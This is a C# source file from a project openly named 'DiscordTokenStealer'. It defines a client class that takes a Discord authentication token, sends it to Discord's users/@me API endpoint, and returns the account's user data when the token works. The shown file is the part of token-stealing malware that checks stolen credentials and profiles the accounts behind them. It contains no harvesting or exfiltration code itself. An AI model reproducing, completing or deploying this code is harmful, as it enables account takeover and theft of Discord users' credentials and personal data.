using System.Net;
using System.Text.Json;

namespace DiscordTokenStealer.Discord
{
    public class DiscordClient : IDisposable
    {
        private readonly HttpClient _httpClient;
        public DiscordClient()
        {
            _httpClient = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true)
            {
                Timeout = TimeSpan.FromSeconds(15),
                BaseAddress = new Uri("https://discordapp.com/api/")
            };
        }

        public async Task<DiscordUser?> Login(string token)
        {
            using HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "users/@me");
            request.Headers.TryAddWithoutValidation("Authorization", token);
            using HttpResponseMessage response = await _httpClient.SendAsync(request);
            if (response.StatusCode != HttpStatusCode.OK)
            {
                return null;
            }
            await using Stream json = await response.Content.ReadAsStreamAsync();
            return await JsonSerializer.DeserializeAsync<DiscordUser>(json);
        }

        public void Dispose()
        {
            _httpClient.Dispose();
            GC.SuppressFinalize(this);
        }
    }
}
